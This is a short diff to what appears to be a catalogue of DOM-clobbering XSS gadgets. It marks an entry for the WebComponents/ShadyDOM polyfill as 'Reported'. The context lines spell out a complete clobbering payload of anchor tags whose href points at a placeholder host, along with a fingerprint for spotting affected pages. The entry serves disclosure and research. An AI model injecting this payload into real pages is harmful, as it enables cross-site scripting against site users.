@@ -8,7 +8,7 @@
 + Fingerprint: `window.WebComponents !== 'undefined'`
 + Payload: ```<a id="ShadyDOM"></a><a id="ShadyDOM" name="force"></a><a id="WebComponents"></a><a id="WebComponents" name="root" href="https://xxx.xxx.xxx"></a>```
 + Impact: XSS
-+ Status: N/A
++ Status: Reported
 + CVE: N/A
 + Foundby: TheHulk
 
